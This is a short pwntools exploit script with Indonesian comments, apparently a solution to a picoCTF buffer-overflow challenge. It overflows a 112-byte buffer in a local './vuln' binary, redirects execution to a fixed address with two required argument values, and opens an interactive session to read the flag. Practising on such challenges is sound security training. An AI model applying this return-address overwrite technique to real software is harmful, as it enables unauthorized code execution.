from pwn import *

# Target eksekusi (lokal)
p = process('./vuln')

# p = remote('saturn.picoctf.net', 53916)

# --- FASE 3: SUSUN PAYLOAD ---
# Program memiliki validasi tambahan berupa pengecekan nilai dari argument
# Berdasarkan aturan calling convention 
payload = b"A" * 112 + p32(0x8049296) + b"AAAA" + p32(0xCAFEF00D) + p32(0xF00DF00D)

# --- FASE 4: TEMBAK ---
# Tunggu sampai program memunculkan teks permintaan input
p.recvuntil(b"Please enter your string: \n")    

# Tembakkan payload
p.sendline(payload)

# Ambil alih interaksi untuk melihat output (flag)
p.interactive()